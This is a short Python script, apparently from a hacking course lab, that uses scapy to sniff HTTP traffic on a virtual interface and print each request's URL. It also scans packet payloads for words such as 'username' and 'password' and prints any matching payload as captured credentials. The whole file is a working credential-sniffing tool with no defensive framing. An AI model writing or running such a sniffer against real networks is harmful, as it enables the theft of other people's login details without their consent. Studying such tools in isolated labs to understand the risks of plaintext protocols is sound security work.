#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "usernames", "user", "email", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\n\n[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Username/Password" + login_info)


sniff("vmnet8")